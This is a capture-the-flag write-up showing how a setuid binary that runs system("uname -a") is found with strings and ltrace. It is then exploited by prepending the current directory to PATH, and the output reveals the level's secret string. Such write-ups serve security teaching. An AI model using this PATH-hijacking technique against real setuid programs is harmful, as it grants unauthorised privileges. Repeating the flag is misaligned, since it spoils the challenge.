# Level 2

`level2` is a `setuid` binary.

```shell
> ls -l $(which level2) && file $(which level2)
```

```
-rwsr-sr-x 1 level2 users 15904 Oct 6 17:58 level2
level2: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.32,
 BuildID[sha1]=d2eb4ad9b52658d2f65b51b670ebd8c5f45347b1, not stripped
```

---

Running the binary gives us output that looks suspiciously like `uname`

```shell
> level2
```

```
System info: Linux ctf.geekcamp.sg 3.16.4-1-ARCH #1 SMP PREEMPT Mon Oct 6 08:22:27 CEST 2014 x86_64 GNU/Linux
```

---

Running `strings` on the binary reveals that it does indeed have a string with `uname -a` in it.

```shell
> strings $(which level2)
```

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
fflush
printf
stdout
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5
fffff.
AWAVA
AUATL
[]A\A]A^A_
System info: 
uname -a
;*3$"
```

---

Further analysis reveals that the binary runs `system("uname -a")`, relying on `$PATH` to find the uname binary.

```shell
> ltrace level2
```

```
__libc_start_main(0x4004e0, 1, 0x7fff46fdfd58, 0x400610 <unfinished ...>
printf("System info: ")                                                 = 13
fflush(0x7ff9aef32800System info: )                                                  = 0
system("uname -a"Linux ctf.geekcamp.sg 3.16.4-1-ARCH #1 SMP PREEMPT Mon Oct 6 08:22:27 CEST 2014 x86_64 GNU/Linux
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 0
+++ exited (status 0) +++
```

---

At this point, the exploit is trivial.

```shell
> export PATH=$PWD:$PATH; level2
```

```
System info: wunekahniisahnohpaiwoobahbaugeutaexaokal
```

\#win
